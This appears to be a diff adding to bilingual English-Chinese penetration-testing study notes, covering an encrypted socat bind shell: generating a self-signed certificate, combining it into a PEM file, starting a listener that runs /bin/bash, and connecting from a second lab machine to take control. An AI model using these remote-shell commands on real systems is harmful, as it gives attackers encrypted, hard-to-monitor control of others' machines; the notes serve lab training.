@@ -231,4 +231,42 @@ We will use the openssl application, to create a self-signed certificate using t
 openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
 ```
 > openssl 生成一個新的 RSA 私鑰和自簽憑證
+> `req & -x509`: 生成證書簽名請求（CSR）和自簽憑證\
+> `-newkey rsa`:2048 生成一個新的 RSA 私鑰，密鑰長度為 2048 位元\
+> `-nodes`: 儲存私鑰的時候不加密，即不使用密碼保護\
+> `-keyout bind_shell.key`: 生成私鑰檔案 bind_shell.key\
+> `-days 362`: 簽證期限 362 天\
+> `-out bind_shell.crt`: 生成的自簽憑證 bind_shell.crt
 
+![image](https://hackmd.io/_uploads/rkdo6A5UC.png)\
+(自簽憑證資訊可以參考另一篇: [Apache SSL 憑證申請安裝](https://github.com/Chw41/Server-conf./blob/main/Secure%20Sockets%20Layer/README.md#%E5%BB%BA%E7%AB%8B%E7%A7%81%E9%91%B0-serverkey))
+
+After key and certificate have been generated,
+we need to convert them into a format socat will accept.
+![image](https://hackmd.io/_uploads/rJA9PyoL0.png)
+```
+cat {key file} {.crt file} > {.pem file}
+```
+> 將私鑰和憑證合併成 PEM
+
+>[!Important]
+> .crt 和 .pem 差別,
+> - .crt: 通常只包含憑證本人 (Binary 格式)
+> - .pem: 可以包含多種類型的加密資料 ex. PRIVATE KEY, PUBLIC KEY, CERTIFICATE ( ASCII 編碼的 Base64 格式)
+
+#### 2. Create socat listener
+Now let's create the encrypted socat listener
+```
+sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
+```
+> `cert=bind_shell.pem`: 使用 bind_shell.pem 中的證書和私鑰來進行加密通訊\
+> `verify=0`: 不驗證對方的certificate，允許所有連接\
+> `fork`: 當每個新連接，fork 出一個child process來處理，允許多個連線
+
+**(Bob Mode)**
+- Alice IP: 10.11.0.4
+```
+socat - OPENSSL:10.11.0.4:443,verify=0
+```
+![image](https://hackmd.io/_uploads/ByVghyiUC.png)
+> Bob 成功控制 Alice 電腦
